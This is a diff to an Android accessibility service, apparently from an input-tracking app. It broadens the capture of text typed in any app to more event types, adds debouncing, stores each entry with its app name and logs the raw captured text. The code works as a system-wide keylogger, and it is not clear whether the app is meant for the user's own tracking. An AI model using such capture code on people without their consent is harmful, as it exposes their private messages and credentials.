@@ -4,12 +4,17 @@ import android.accessibilityservice.AccessibilityService
 import android.content.Intent
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 
 class InputAccessibilityService : AccessibilityService() {
 
     private lateinit var repository: InputRepository
 
     private var screenshotReceiver: android.content.BroadcastReceiver? = null
+
+    // Debounce: avoid capturing duplicate events from multiple event types per keystroke
+    private val lastCaptureMap = mutableMapOf<String, Pair<Long, String>>() // packageName -> (timestamp, text)
+    private val DEBOUNCE_MS = 800L
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -52,26 +57,77 @@ class InputAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
-        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+        val eventType = event.eventType
+
+        // Extract text content - try event.text first, then fall back to source node text
+        var text: String? = null
+        var sourceNode: AccessibilityNodeInfo? = null
+
+        when (eventType) {
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                val eventText = event.text.joinToString(" ")
+                if (eventText.isNotBlank()) {
+                    text = eventText
+                }
+            }
+            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
+                sourceNode = event.source
+                if (sourceNode != null) {
+                    val nodeText = sourceNode.text?.toString()
+                    if (!nodeText.isNullOrBlank()) {
+                        text = nodeText
+                    }
+                }
+            }
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                // Only capture when text content actually changes
+                if (event.contentChangeTypes and android.view.accessibility.AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT != 0) {
+                    sourceNode = event.source
+                    if (sourceNode != null) {
+                        val nodeText = sourceNode.text?.toString()
+                        if (!nodeText.isNullOrBlank()) {
+                            text = nodeText
+                        }
+                    }
+                }
+            }
+        }
+
+        sourceNode?.let { it.recycle() }
+
+        if (text != null) {
             val packageName = event.packageName?.toString() ?: "Unknown"
             val appName = getAppName(packageName)
-            val text = event.text.joinToString(" ")
-            
+
             // Avoid capturing empty or blank strings unnecessarily
             if (text.isNotBlank()) {
-                // Increment keystrokes count in SharedPreferences
-                val prefs = applicationContext.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
-                val current = prefs.getInt("total_keystrokes", 0)
-                prefs.edit().putInt("total_keystrokes", current + 1).apply()
+                // Debounce: skip if same package captured recently with overlapping text
+                val now = System.currentTimeMillis()
+                val lastCapture = lastCaptureMap[packageName]
+                val isDuplicate = lastCapture != null &&
+                        (now - lastCapture.first) < DEBOUNCE_MS &&
+                        (text.startsWith(lastCapture.second) || lastCapture.second.startsWith(text))
 
-                val inputEvent = InputEvent(
-                    timestamp = System.currentTimeMillis(),
-                    packageName = packageName,
-                    appName = appName,
-                    text = text
-                )
-                repository.addEvent(inputEvent)
-                Log.d(TAG, "Captured input: $text from $packageName")
+                if (!isDuplicate || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                    // Always allow TYPE_VIEW_TEXT_CHANGED through; for other types, only pass if not duplicate
+                    if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || !isDuplicate) {
+                        lastCaptureMap[packageName] = Pair(now, text)
+
+                        // Increment keystrokes count in SharedPreferences
+                        val prefs = applicationContext.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
+                        val current = prefs.getInt("total_keystrokes", 0)
+                        prefs.edit().putInt("total_keystrokes", current + 1).apply()
+
+                        val inputEvent = InputEvent(
+                            timestamp = now,
+                            packageName = packageName,
+                            appName = appName,
+                            text = text
+                        )
+                        repository.addEvent(inputEvent)
+                        Log.d(TAG, "Captured input(eventType=$eventType): $text from $packageName")
+                    }
+                }
             }
         }
     }
